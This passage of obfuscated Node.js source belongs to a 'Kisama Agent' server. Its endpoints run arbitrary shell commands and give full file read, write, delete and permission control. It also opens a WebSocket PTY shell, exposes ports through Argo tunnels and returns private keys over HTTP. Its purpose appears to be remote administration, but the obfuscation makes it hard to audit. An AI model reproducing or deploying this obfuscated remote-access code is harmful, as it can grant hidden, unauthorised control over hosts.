            const c = a0o[go(0x884)](b['AfzSG'](String, b['hJqxn'](a, '')))[go(0x52c)]();
            return c === b[go(0x732)] || b[go(0x91f)](c, b[go(0x28b)]);
        }
        return !![];
    }
    ['_sendWelcome'](a) {
        const gp = a0aY, b = {
                'lMncz': gp(0x488),
                'QlSNe': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[gp(0x317)](JSON[gp(0x789)]({
                'type': b[gp(0x396)],
                'shell': a0aT[gp(0x227)](a),
                'path': a,
                'incognito': !!(this[gp(0x7d2)] && a0aT[gp(0x4d2)](a))
            }));
            this[gp(0x8da)] && this[gp(0x2f7)] && this[gp(0x2f7)][gp(0x86d)] && (c = this['cipher'][gp(0x776)](c)), this[gp(0x6a3)] && b[gp(0x22e)](this['websocket'][gp(0x82c)], 0x1) && this[gp(0x6a3)][gp(0x272)](c);
        } catch (d) {
        }
    }
    [a0aY(0x397)](a) {
        const gq = a0aY, b = {
                'OdGSE': gq(0x1af),
                'UevIs': gq(0x646),
                'gFsrK': function (c, d) {
                    return c === d;
                },
                'jsgbW': function (c, d) {
                    return c === d;
                },
                'mLLQf': function (c, d) {
                    return c !== d;
                },
                'xrpcJ': gq(0x262)
            };
        if (!this[gq(0x802)])
            return;
        try {
            const c = Buffer[gq(0x317)](a);
            let d;
            this['useNoise'] ? d = this['cipher']['decrypt'](c) : d = c;
            let f = ![], g = d['toString'](b[gq(0x452)]);
            if (g[gq(0x2eb)]()['startsWith']('{'))
                try {
                    const h = JSON['parse'](g);
                    f = !![];
                    if (h[gq(0x5d2)] === b[gq(0x5d1)]) {
                        let i = Buffer[gq(0x317)](JSON[gq(0x789)]({ 'type': b['UevIs'] }));
                        if (this[gq(0x8da)])
                            i = this[gq(0x2f7)][gq(0x776)](i);
                        this[gq(0x6a3)][gq(0x272)](i);
                        return;
                    }
                    if (b[gq(0x632)](h[gq(0x5d2)], gq(0x480))) {
                        this[gq(0x802)][gq(0x480)](h[gq(0x75c)] || 0x50, h[gq(0x712)] || 0x18);
                        return;
                    }
                    if (b['jsgbW'](h['type'], gq(0x3b4)) && b['mLLQf'](h[gq(0x7a4)], undefined)) {
                        let j = b[gq(0x508)](h[gq(0x1de)], b[gq(0x710)]) ? Buffer[gq(0x317)](h[gq(0x7a4)], b[gq(0x710)])[gq(0x62f)](b[gq(0x452)]) : h['data'];
                        this['ptyProcess'][gq(0x624)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[gq(0x802)]['write'](d[gq(0x62f)](b[gq(0x452)]));
        } catch (l) {
            a0D['info'](gq(0x8e5) + this['requestId'] + ']\x20⚠️\x20指令处理异常:\x20' + l['message']);
            if (this[gq(0x8da)])
                this[gq(0x3c9)]();
        }
    }
}
async function a0aU() {
    const gr = a0aY, a = { 'MbsWL': '@noble/curves/secp256k1.js' }, b = await import(gr(0x5d6));
    a0A = b['p256'];
    const c = await import(a['MbsWL']);
    a0B = c['secp256k1'];
}
async function a0aV(a = {}) {
    const gs = a0aY, b = {
            'DujhL': gs(0x4dc),
            'RNHNE': gs(0x92c),
            'PSjjv': gs(0x696),
            'Rpcsq': gs(0x838),
            'lkYma': function (c, d) {
                return c === d;
            },
            'vyAcr': gs(0x6ae),
            'NFDrx': gs(0x305),
            'sZFnK': gs(0x18d),
            'HEnlV': function (c, d) {
                return c === d;
            },
            'KnNxy': function (c, d) {
                return c !== d;
            },
            'ySoQd': function (c, d, f) {
                return c(d, f);
            },
            'utUid': function (c, d) {
                return c < d;
            },
            'alawm': function (c, d) {
                return c > d;
            },
            'pxUUC': gs(0x5ea),
            'LUFez': gs(0x545),
            'HXalf': function (c, d) {
                return c(d);
            },
            'pxPzW': function (c, d) {
                return c === d;
            },
            'vYWoM': gs(0x658),
            'gOgVj': function (c, d) {
                return c / d;
            },
            'AXJot': gs(0x1ed),
            'wDFxb': gs(0x1e9),
            'uzukR': function (c, d) {
                return c === d;
            },
            'SpoSM': gs(0x33e),
            'wtvgn': 'object',
            'WGIig': gs(0x16c),
            'JRSMm': 'x-file-path',
            'KctNV': 'x-chunk-id',
            'OlSqq': 'x-total-chunks',
            'kFRgA': gs(0xda),
            'SgHzh': function (c, d) {
                return c !== d;
            },
            'PpLJU': function (c, d) {
                return c(d);
            },
            'Amnva': gs(0x1c8),
            'insdq': 'x-original-path',
            'lHqqg': gs(0x7be),
            'aithN': function (c, d) {
                return c <= d;
            },
            'yRgLk': gs(0x262),
            'hdCZB': gs(0x61f),
            'jLcXw': gs(0x241),
            'HgziL': gs(0x5bf),
            'skzds': gs(0x612),
            'SJLxK': function (c, d, f) {
                return c(d, f);
            },
            'ipayR': function (c, d) {
                return c < d;
            },
            'fpsvN': function (c, d) {
                return c > d;
            },
            'uaKhE': gs(0x719),
            'RQLTB': function (c, d) {
                return c === d;
            },
            'wxabE': function (c, d) {
                return c === d;
            },
            'OnVPq': function (c, d) {
                return c === d;
            },
            'aruNt': function (c, d) {
                return c < d;
            },
            'AQEpI': function (c, d) {
                return c ?? d;
            },
            'kBkuE': gs(0x299),
            'bJJsT': function (c, d) {
                return c === d;
            },
            'VpKKO': gs(0x852),
            'UFziv': gs(0x8f8),
            'CGGDc': function (c, d) {
                return c(d);
            },
            'Wgknr': 'utf-8',
            'GFApR': gs(0x80d),
            'Zubdx': gs(0x370),
            'SEWjj': function (c) {
                return c();
            },
            'rebaV': gs(0x698),
            'lOwRX': gs(0x5dc),
            'ghrlE': gs(0x43b),
            'hdnta': gs(0x4b0),
            'hoeMW': gs(0x8de),
            'YqDAh': gs(0x4e8),
            'DfFpA': gs(0x22f),
            'icJLM': function (c, d) {
                return c(d);
            },
            'adEmo': gs(0x55b),
            'GUbnC': gs(0x4f9),
            'QrSQP': '/api/tempkey',
            'jSljR': '/api/status',
            'lxAYc': gs(0x3a0),
            'NELeM': gs(0x356),
            'kXTRt': '/api/file/list',
            'bAJGn': '/api/file/authority',
            'QKXdb': '/api/file',
            'rjFzi': gs(0x369),
            'BnTyP': gs(0x11c),
            'MgsHF': gs(0x2ca),
            'loKAk': gs(0x491),
            'KETVT': gs(0x28d),
            'WvdEM': gs(0x33d),
            'TsLxO': gs(0xcf),
            'qiDjF': gs(0x677),
            'qEkle': gs(0x499),
            'SNbYR': gs(0x4bd),
            'hNToG': gs(0x779),
            'zSHww': gs(0x43f),
            'opWjX': gs(0x44f),
            'UMKfS': gs(0x12f),
            'RLlLG': 'SIGINT\x20handler\x20registered',
            'Qklds': gs(0x8fd)
        };
    try {
        await b['SEWjj'](a0aU), a0D['debug']('Starting\x20main()\x20function...'), a0P[gs(0x135)](a), a0D['debug'](b[gs(0x836)]), a0P[gs(0x4b3)](), a0D['debug']('Config\x20validated'), a0D[gs(0x52b)](gs(0x4cf));
        const c = new a0R(a0P[gs(0x210)], a0P[gs(0x706)]);
        a0D[gs(0x52b)](b['lOwRX']);
        !a0P[gs(0x628)] && !c[gs(0x57f)] && (a0D[gs(0x1e9)](b[gs(0x37a)]), a0D[gs(0x1e9)](b['hdnta']), process[gs(0x56d)](0x1));
        a0D['debug'](gs(0x6f8));
        const d = new a0Q();
        d[gs(0x656)] = () => a0P[gs(0x82e)](), a0D[gs(0x52b)](gs(0x83b)), a0D[gs(0x52b)](b['hoeMW']);
        const f = new a0U();
        a0D[gs(0x52b)](b['YqDAh']), a0D['debug'](b[gs(0x759)]);
        const g = b[gs(0x11f)](a0f);
        b[gs(0x433)](a0x, g), a0D[gs(0x52b)](b[gs(0x30b)]), g[gs(0x689)]((l, m, n) => {
            const gt = gs;
            m[gt(0x625)](gt(0x8a4), '*'), m[gt(0x625)](b[gt(0x60b)], b[gt(0x476)]), m[gt(0x625)](gt(0x1cd), b[gt(0x18c)]), m['header'](b[gt(0x873)], gt(0x105));
            if (b['lkYma'](l[gt(0x43c)], b['vyAcr']))
                return a0P[gt(0x628)] && m['set'](b['NFDrx'], b[gt(0x5fa)]), m[gt(0x5c3)](0xc8)[gt(0x233)]();
            n();
        }), g[gs(0x689)](a0f[gs(0x155)]({
            'type': l => l['path'] !== gs(0x254),
            'limit': b[gs(0x6f3)]
        })), g['use'](a0f['urlencoded']({ 'extended': !![] })), g[gs(0x689)](b[gs(0x577)](a0T, c, d)), a0D['debug'](gs(0x88a)), g[gs(0x14d)](gs(0x216), async (l, m) => {
            const gu = gs;
            try {
                const n = await a0P[gu(0x909)](), o = await a0P[gu(0x25f)](n['virtualization'] || ''), p = await a0P[gu(0x56c)](), q = a0U[gu(0x2a0)](n, o, p);
                b[gu(0x638)](l[gu(0x922)], !![]) ? (q[gu(0x4d8)] = a0P[gu(0x3a3)], q['noise_key'] = a0P[gu(0x4b7)]) : (q[gu(0x4d8)] = null, q['noise_key'] = null), m[gu(0x46b)](q), b['HEnlV'](a0P['KMODE'], '1') && a0aN[gu(0x355)]();
            } catch (r) {
                m[gu(0x5c3)](0x1f4)['json']({
                    'status': gu(0x1e9),
                    'message': r['message']
                });
            }
        }), g['get'](b[gs(0x85d)], (l, m) => {
            const gv = gs;
            let n = a0P['TEMPKEY_DEFAULT_TTL_HOURS'];
            if (b[gv(0x30f)](l[gv(0x353)][gv(0x77b)], undefined)) {
                const s = b['ySoQd'](parseInt, l[gv(0x353)][gv(0x77b)], 0xa);
                if (Number[gv(0x517)](s) || b['utUid'](s, 0x1) || b[gv(0x8f5)](s, a0P['TEMPKEY_MAX_TTL_HOURS']))
                    return m['status'](0x1a6)['json']({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0P[gv(0x811)] });
                n = s;
            }
            const o = b[gv(0x638)](typeof l[gv(0x353)][gv(0x48d)], gv(0x33e)) ? l['query']['format'][gv(0x2eb)]()[gv(0x52c)]() : '';
            let p;
            if (b[gv(0x5ec)](o, '') || o === gv(0x64b))
                p = 'full';
            else {
                if (b[gv(0x638)](o, b['pxUUC']))
                    p = gv(0x5ea);
                else
                    return m[gv(0x5c3)](0x1a6)['json']({ 'error': b[gv(0x494)] });
            }
            const q = d['getOrCreate'](n), r = u => new Date(u * 0x3e8)[gv(0x618)]()[gv(0x7ee)](gv(0x768), 'Z');
            m[gv(0x46b)]({
                'status': 'ok',
                'key_id': q[gv(0x21c)],
                'ttl_seconds': q['ttl_seconds'],
                'created_at': r(q[gv(0x15a)]),
                'expires_at': b[gv(0x578)](r, q['expires_at']),
                'ecdsa': b['HEnlV'](p, b['pxUUC']) ? {
                    'private_key': q[gv(0x915)],
                    'public_key': q[gv(0x6cb)]
                } : {
                    'private_key': q[gv(0x782)]['trim'](),
                    'public_key': q['ecdsa_public_key']['trim']()
                },
                'ecies': b[gv(0x8c6)](p, b[gv(0x2f6)]) ? {
                    'private_key': q[gv(0x276)],
                    'public_key': q[gv(0x455)]
                } : {
                    'private_key': q[gv(0x276)],
                    'public_key': q[gv(0x6d6)]
                }
            });
        }), g[gs(0x14d)](b['jSljR'], async (l, m) => {
            const gw = gs;
            try {
                const n = Math[gw(0x7c7)](Date[gw(0x4ea)]() / 0x3e8);
                !a0P[gw(0x2f8)] || b['alawm'](n - a0P[gw(0x8d7)], a0P['STATUS_CACHE_TTL']) ? (!a0P[gw(0x120)] && (a0P[gw(0x120)] = f[gw(0x6a7)]()[gw(0x3f7)](p => {
                    const gx = gw, q = gx(0x5b4)['split']('|');
                    let r = 0x0;
                    while (!![]) {
                        switch (q[r++]) {
                        case '0':
                            a0P[gx(0x2f8)] = p;
                            continue;
                        case '1':
                            a0P[gx(0x120)] = null;
                            continue;
                        case '2':
                            a0D[gx(0x52b)](b[gx(0x260)]);
                            continue;
                        case '3':
                            return p;
                        case '4':
                            a0P[gx(0x8d7)] = Math[gx(0x7c7)](b[gx(0x2ed)](Date[gx(0x4ea)](), 0x3e8));
                            continue;
                        }
                        break;
                    }
                })[gw(0x843)](p => {
                    const gy = gw;
                    a0P[gy(0x120)] = null;
                    throw p;
                })), await a0P[gw(0x120)]) : a0D[gw(0x52b)](b['AXJot']);
                const o = { ...a0P[gw(0x2f8)] };
                m[gw(0x46b)](o);
            } catch (p) {
                m[gw(0x5c3)](0x1f4)['json']({
                    'status': b[gw(0x384)],
                    'message': p[gw(0x113)]
                });
            }
        });
        const h = async (l, m) => {
            const gz = gs;
            try {
                let n = null;
                if (b[gz(0x104)](typeof l[gz(0x3ed)], b[gz(0x4ab)]))
                    n = l[gz(0x3ed)][gz(0x2eb)]();
                else
                    l[gz(0x3ed)] && b[gz(0x104)](typeof l[gz(0x3ed)], b[gz(0x16e)]) && (n = l[gz(0x3ed)][gz(0x41a)] || '');
                if (!n)
                    return m[gz(0x5c3)](0x190)[gz(0x46b)]({
                        'status': b[gz(0x384)],
                        'message': b[gz(0x571)]
                    });
                const o = await a0V[gz(0xec)](n, {
                    'cwd': l[gz(0x3ed)]['cwd'],
                    'env': l['body'][gz(0x247)],
                    'timeout': a0P[gz(0x124)]
                });
                m[gz(0x46b)](o);
            } catch (p) {
                m[gz(0x5c3)](0x1f4)[gz(0x46b)]({
                    'status': b[gz(0x384)],
                    'message': p['message']
                });
            }
        };
        g[gs(0x895)](gs(0x6f2), h);
        for (const l of [
                b['lxAYc'],
                b[gs(0x454)],
                gs(0x7a6)
            ]) {
            g[gs(0x895)](l, h);
        }
        g[gs(0x895)](b['kXTRt'], async (m, n) => {
            const gA = gs;
            try {
                const o = await a0Y[gA(0x231)](m[gA(0x3ed)][gA(0x7d3)], m[gA(0x3ed)][gA(0x760)]);
                n['json']({
                    'status': 'ok',
                    'count': o[gA(0x8fc)],
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)[gA(0x46b)]({
                    'status': gA(0x1e9),
                    'message': p[gA(0x113)]
                });
            }
        }), g[gs(0x895)](b[gs(0x29e)], async (m, n) => {
            const gB = gs;
            try {
                const o = await a0Y['getFilePermissions'](m['body'][gB(0x2f2)] || []);
                n['json']({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[gB(0x5c3)](0x1f4)[gB(0x46b)]({
                    'status': gB(0x1e9),
                    'message': p[gB(0x113)]
                });
            }
        }), g['put'](gs(0x323), async (m, n) => {
            const gC = gs;
            try {
                const o = m[gC(0x3ed)][gC(0x18a)] || {}, p = b[gC(0x5ec)](m[gC(0x3ed)][gC(0x760)], !![]), q = await a0Y['setFilePermissions'](o, p);
                n[gC(0x46b)](q);
            } catch (r) {
                n[gC(0x5c3)](0x1f4)[gC(0x46b)]({
                    'status': gC(0x1e9),
                    'message': r[gC(0x113)]
                });
            }
        }), g['post'](gs(0xe1), async (m, n) => {
            const gD = gs;
            try {
                const o = await a0Y[gD(0x5ba)](m[gD(0x3ed)]['path']);
                n[gD(0x46b)](o);
            } catch (p) {
                n[gD(0x5c3)](0x1f4)['json']({
                    'status': b[gD(0x384)],
                    'message': p['message']
                });
            }
        }), g[gs(0x895)](b[gs(0x483)], async (m, n) => {
            const gE = gs;
            try {
                const o = await a0Y[gE(0x584)](m[gE(0x3ed)][gE(0x7d3)], m[gE(0x3ed)][gE(0x59f)], m[gE(0x3ed)][gE(0xeb)], m[gE(0x3ed)][gE(0x6c0)], m[gE(0x3ed)][gE(0x808)]);
                n[gE(0x46b)](o);
            } catch (p) {
                n['status'](0x1f4)['json']({
                    'status': gE(0x1e9),
                    'message': p[gE(0x113)]
                });
            }
        }), g[gs(0x895)]('/api/fileraw', a0f[gs(0x598)]({
            'type': b['rjFzi'],
            'limit': b[gs(0x6f3)]
        }), async (m, n) => {
            const gF = gs;
            try {
                const o = decodeURIComponent(m[gF(0x7c1)][b[gF(0x5e3)]] || ''), p = b[gF(0x578)](decodeURIComponent, m[gF(0x7c1)][gF(0x8ac)] || ''), q = m[gF(0x7c1)][b[gF(0x5f7)]], r = m[gF(0x7c1)][b['OlSqq']];
                if (!o || !p)
                    return n['status'](0x190)[gF(0x46b)]({
                        'status': b[gF(0x384)],
                        'completed': ![],
                        'message': b[gF(0x248)]
                    });
                const s = b[gF(0x2fb)](q, undefined) ? parseInt(String(q), 0xa) : null, t = b[gF(0x2fb)](r, undefined) ? parseInt(b['PpLJU'](String, r), 0xa) : null, u = m[gF(0x3ed)];
                if (!Buffer[gF(0x3cd)](u))
                    return n['status'](0x190)['json']({
                        'status': b[gF(0x384)],
                        'completed': ![],
                        'message': gF(0x282)
                    });
                const v = await a0Y['uploadFileRaw'](o, p, u, s, t);
                n['json'](v);
            } catch (w) {
                n[gF(0x5c3)](0x1f4)['json']({
                    'status': 'error',
                    'completed': ![],
                    'message': w[gF(0x113)]
                });
            }
        }), g['post'](b[gs(0x627)], async (m, n) => {
            const gG = gs;
            try {
                const o = await a0Y[gG(0x904)](m[gG(0x3ed)][gG(0x7d3)]);
                n[gG(0x6c4)](b[gG(0x533)], o[gG(0x3e9)][gG(0x62f)]()), n[gG(0x6c4)](b[gG(0x4ac)], o['path']), n[gG(0x6c4)](b['lHqqg'], gG(0x369));
                if (!a0P['DEBUG'] && b[gG(0x638)](m[gG(0x625)](gG(0x35f)), '1') && b[gG(0x8f5)](a0P[gG(0x33f)], 0x0) && b['aithN'](o['size'], a0P['DOWNLOAD_ENCRYPT_MAX']))
                    try {
                        const p = c[gG(0x553)](o[gG(0xeb)], Buffer['from'](a0P['SESSION_KEY'], b[gG(0x5b1)]));
                        return n[gG(0x6c4)](b['NFDrx'], b[gG(0x6da)]), n[gG(0x272)](p);
                    } catch (q) {
                        return n['status'](0x1f4)['json']({
                            'status': gG(0x1e9),
                            'message': b[gG(0x7ed)]
                        });
                    }
                return n[gG(0x272)](o[gG(0xeb)]);
            } catch (r) {
                n['status'](0x1f4)[gG(0x46b)]({
                    'status': b['wDFxb'],
                    'message': r['message']
                });
            }
        }), g[gs(0x100)](b[gs(0x483)], async (m, n) => {
            const gH = gs;
            try {
                let o = m['body'][gH(0x2f2)];
                if (!o || !Array[gH(0x22c)](o)) {
                    o = [];
                    if (m[gH(0x3ed)]['path'])
                        o[gH(0x1f0)](m[gH(0x3ed)][gH(0x7d3)]);
                    if (m[gH(0x3ed)][gH(0x931)])
                        o['push'](m[gH(0x3ed)]['path2']);
                }
                const p = await a0Y[gH(0x778)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n[gH(0x5c3)](0x1f4)[gH(0x46b)]({
                    'status': gH(0x1e9),
                    'message': q[gH(0x113)]
                });
            }
        }), g[gs(0xd6)](b[gs(0x483)], async (m, n) => {
            const gI = gs;
            try {
                const o = await a0Y[gI(0x165)](m['body'][gI(0x81f)] || m['body']);
                n[gI(0x46b)]({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o[gI(0x3fe)](p => p[gI(0x5c3)] === 'ok')[gI(0x8fc)],
                    'results': o
                });
            } catch (p) {
                n[gI(0x5c3)](0x1f4)[gI(0x46b)]({
                    'status': b[gI(0x384)],
                    'message': p[gI(0x113)]
                });
            }
        }), g['post'](gs(0x23a), async (m, n) => {
            const gJ = gs;
            try {
                const o = await a0Y['copyFiles'](m['body']);
                n[gJ(0x46b)]({
                    'status': 'ok',
                    'total': o['length'],
                    'success': o[gJ(0x3fe)](p => p[gJ(0x5c3)] === 'ok')['length'],
                    'results': o
                });
            } catch (p) {
                n[gJ(0x5c3)](0x1f4)[gJ(0x46b)]({
                    'status': b[gJ(0x384)],
                    'message': p[gJ(0x113)]
                });
            }
        }), g[gs(0x895)](b[gs(0x2b8)], async (m, n) => {
            const gK = gs;
            try {
                const o = await a0Y[gK(0x4bf)](m['body']['path']);
                n['json'](o);
            } catch (p) {
                n[gK(0x5c3)](0x1f4)[gK(0x46b)]({
                    'status': b[gK(0x384)],
                    'message': p[gK(0x113)]
                });
            }
        }), g['post'](gs(0x8dd), async (m, n) => {
            const gL = gs;
            try {
                const o = m[gL(0x3ed)] || {};
                if (!o['path'])
                    return n[gL(0x5c3)](0x190)['json']({ 'error': b[gL(0x407)] });
                if (!Array['isArray'](o[gL(0x31c)]) || b[gL(0x638)](o[gL(0x31c)][gL(0x8fc)], 0x0))
                    return n['status'](0x190)[gL(0x46b)]({ 'error': b[gL(0x345)] });
                const p = await a0Y[gL(0x440)](o[gL(0x7d3)], o[gL(0x31c)], !!o[gL(0x891)]);
                n[gL(0x46b)](p);
            } catch (q) {
                const r = /Access denied/['test'](q[gL(0x113)]) ? 0x193 : 0x190;
                n[gL(0x5c3)](r)[gL(0x46b)]({
                    'status': b['wDFxb'],
                    'message': q['message']
                });
            }
        }), g[gs(0x895)](b[gs(0x245)], async (m, n) => {
            const gM = gs;
            try {
                const o = m['body'] || {};
                if (!o[gM(0x7d3)])
                    return n[gM(0x5c3)](0x190)[gM(0x46b)]({ 'error': b['HgziL'] });
                const p = await a0Y[gM(0x78d)](o[gM(0x7d3)], o[gM(0x420)], b['SgHzh'](o[gM(0x219)], ![]), Array[gM(0x22c)](o[gM(0x76e)]) ? o[gM(0x76e)] : null);
                n[gM(0x46b)](p);
            } catch (q) {
                const r = /Access denied/[gM(0x292)](q[gM(0x113)]) ? 0x193 : 0x190;
                n['status'](r)[gM(0x46b)]({
                    'status': gM(0x1e9),
                    'message': q['message']
                });
            }
        }), g[gs(0x14d)](b[gs(0x516)], (m, n) => {
            const gN = gs;
            n[gN(0x46b)](a0a0['getOnetimeTasks']());
        }), g[gs(0x895)](b[gs(0x516)], async (m, n) => {
            const gO = gs;
            try {
                const o = await a0a0[gO(0x308)](m[gO(0x3ed)]);
                n['json'](o);
            } catch (p) {
                n[gO(0x5c3)](0x1f4)[gO(0x46b)]({
                    'status': b[gO(0x384)],
                    'message': p[gO(0x113)]
                });
            }
        }), g[gs(0x14d)](b[gs(0x567)], (m, n) => {
            const gP = gs;
            n[gP(0x46b)](a0a0[gP(0x636)]());
        }), g['post'](gs(0x33d), (m, n) => {
            const gQ = gs;
            try {
                const o = a0a0[gQ(0x461)](m[gQ(0x3ed)]);
                n[gQ(0x46b)](o);
            } catch (p) {
                n[gQ(0x5c3)](0x1f4)[gQ(0x46b)]({
                    'status': b[gQ(0x384)],
                    'message': p[gQ(0x113)]
                });
            }
        }), g[gs(0x14d)]('/api/task/status', (m, n) => {
            const gR = gs;
            n['json'](a0a0[gR(0x5f1)]());
        }), g['get'](b[gs(0x7e5)], (m, n) => {
            const gS = gs;
            let o = b['SJLxK'](parseInt, m[gS(0x353)][gS(0x564)], 0xa) || 0x32;
            o = Math['min'](Math[gS(0x2c1)](o, 0x1), 0x64), n[gS(0x46b)](a0a0[gS(0x560)](o));
        }), g[gs(0x14d)](b[gs(0x70c)], (m, n) => {
            const gT = gs;
            let o = parseInt(m[gT(0x353)]['limit'], 0xa) || 0x32;
            o = Math[gT(0x687)](Math[gT(0x2c1)](o, 0x1), 0x64), n[gT(0x46b)](a0a0[gT(0x52a)](o));
        }), g[gs(0x100)](b[gs(0x7e5)], (m, n) => {
            const gU = gs;
            n[gU(0x46b)](a0a0[gU(0x8ee)]());
        }), g['delete'](b[gs(0x70c)], (m, n) => {
            const gV = gs;
            n['json'](a0a0[gV(0x8a8)]());
        }), g[gs(0x14d)](gs(0x88f), (m, n) => {
            const gW = gs;
            n[gW(0x46b)](a0a0[gW(0x765)]());
        }), g[gs(0x895)](b[gs(0x28f)], async (m, n) => {
            const gX = gs;
            try {
                const o = await a0a0[gX(0x2c5)]();
                n[gX(0x46b)](o);
            } catch (p) {
                n[gX(0x5c3)](0x1f4)[gX(0x46b)]({
                    'status': b['wDFxb'],
                    'message': p[gX(0x113)]
                });
            }
        });
        const i = {
                'debug': (...m) => a0D[gs(0x52b)](m['join']('\x20')),
                'info': (...m) => a0D['info'](m['join']('\x20')),
                'warning': (...m) => a0D[gs(0x6e1)](m['join']('\x20'))
            }, j = new a0aM(i);
        g[gs(0x14d)](b[gs(0x7f2)], (m, n) => {
            const gY = gs, o = j[gY(0x68d)]();
            n[gY(0x46b)]({
                'status': 'ok',
                'count': o[gY(0x8fc)],
                'tunnels': o
            });
        }), g[gs(0x895)](gs(0x4bd), async (m, n) => {
            const gZ = gs;
            try {
                const o = a0aL(m[gZ(0x3ed)]);
                let p = o['port'];
                (p === undefined || p === null || p === '') && (p = a0P[gZ(0x81b)]);
                const q = Number(p);
                if (!Number[gZ(0x2f3)](q) || b[gZ(0x3c0)](q, 0x1) || b[gZ(0x4a3)](q, 0xffff))
                    return n[gZ(0x5c3)](0x1a6)['json']({
                        'status': gZ(0x1e9),
                        'created': ![],
                        'port': p,
                        'message': b['uaKhE']
                    });
                const r = await j['create'](q, b[gZ(0xf7)](o[gZ(0x46d)], !![]));
                n['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[gZ(0x764)],
                    'port': r['port'],
                    'created_at': r[gZ(0x1b3)]
                });
            } catch (s) {
                n[gZ(0x5c3)](s[gZ(0x5c3)] || 0x1f4)[gZ(0x46b)]({
                    'status': 'error',
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[gZ(0x113)]
                });
            }
        }), g['delete'](gs(0x4bd), async (m, n) => {
            const h0 = gs;
            try {
                const o = a0aL(m[h0(0x3ed)]), p = o[h0(0x4c8)], q = b[h0(0x578)](Number, p);
                if (b['HEnlV'](p, undefined) || b[h0(0x2e9)](p, null) || b[h0(0x538)](p, '') || !Number[h0(0x2f3)](q) || b[h0(0x697)](q, 0x1) || q > 0xffff)
                    return n['status'](0x1a6)['json']({
                        'status': 'error',
                        'deleted': 0x0,
                        'port': b['AQEpI'](p, null),
                        'message': b[h0(0x911)]
                    });
                const r = await j[h0(0x77e)](q, o[h0(0x3bb)]);
                if (r['status'] === 'ok')
                    return n[h0(0x46b)]({
                        'status': 'ok',
                        'deleted': r[h0(0x3a5)],
                        'port': q,
                        'tunnels': r[h0(0x316)]
                    });
                return n[h0(0x5c3)](r[h0(0x5c3)])[h0(0x46b)]({
                    'status': h0(0x1e9),
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n[h0(0x5c3)](0x1f4)[h0(0x46b)]({
                    'status': 'error',
                    'deleted': 0x0,
                    'message': s[h0(0x113)]
                });
            }
        }), a0D['debug'](b[gs(0x69a)]), g['ws'](b['zSHww'], async (m, n) => {
            const h1 = gs, o = n[h1(0x547)][0x0];
            a0D[h1(0x52b)](h1(0x5c6) + n[h1(0x6fa)]), a0D[h1(0x52b)](h1(0x5bb) + o);
            const p = n[h1(0x353)][h1(0x71d)], q = n[h1(0x353)][h1(0x1b2)], r = b[h1(0x704)](n['query'][h1(0x3db)], '1'), s = b['RQLTB'](n[h1(0x353)][h1(0x542)], '1');
            a0D[h1(0x52b)](h1(0x7c5) + p);
            if (!p) {
                a0D[h1(0x52b)](b[h1(0x905)]), m[h1(0x4a5)](0x3f0, b[h1(0x27d)]);
                return;
            }
            if (q) {
                const u = a0P[h1(0x8b5)](), v = Buffer[h1(0x317)](b[h1(0x8d5)](String, q), b['Wgknr']), w = Buffer[h1(0x317)](u, b[h1(0x1b9)]), x = v[h1(0x8fc)] === w[h1(0x8fc)] && a0k['timingSafeEqual'](v, w);
                if (!x) {
                    a0D[h1(0x6e1)](h1(0x8e5) + p + h1(0x683)), m[h1(0x4a5)](0x3f0, b[h1(0x619)]);
                    return;
                }
            }
            const t = new a0aT();
            await t['startSession'](m, p, q, r, s);
        }), a0D[gs(0x52b)](gs(0x360)), a0a0[gs(0x117)](), a0D[gs(0x52b)](b[gs(0x466)]);
        const k = g[gs(0x77a)](a0P['PORT'], a0P[gs(0x85e)], () => {
            const h2 = gs;
            a0D[h2(0x52b)]('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0P[h2(0x1fe)] + h2(0x90c) + a0P['HOST'] + ':' + a0P[h2(0x81b)]), a0D[h2(0x52b)](b['Zubdx']), (a0P[h2(0x26a)] === '1' || b[h2(0x638)](a0P['KMODE'], '2') && a0aN['knameValid']()) && a0aN[h2(0x123)](j);
        });
        process['on'](b['UMKfS'], () => {
            const h3 = gs;
            a0D[h3(0x52b)](h3(0x39b)), k[h3(0x4a5)](), process[h3(0x56d)](0x0);
        }), a0D[gs(0x52b)](b[gs(0x2dc)]);
    } catch (m) {
        a0D[gs(0x1e9)](b[gs(0x85f)], m), process[gs(0x56d)](0x1);
    }
}
(require[a0aY(0x39e)] === module || require[a0aY(0x39e)]?.['filename']?.['includes']('ts-node')) && a0aV()[a0aY(0x843)](a0D[a0aY(0x1e9)]);
module[a0aY(0x744)] = {
    'main': a0aV,
    'loadCurves': a0aU,
    'Config': a0P,
    'CryptoManager': a0R,
    'SystemInfoCollector': a0U,
    'CommandExecutor': a0V,
    'FileManager': a0Y,
    'TaskManager': a0a0,
    'TaskStore': a0Z,
    'ArgoTunnelManager': a0aM,
    'KModeController': a0aN,
    'ZipArchiver': a0X,
    'TempKeyManager': a0Q
};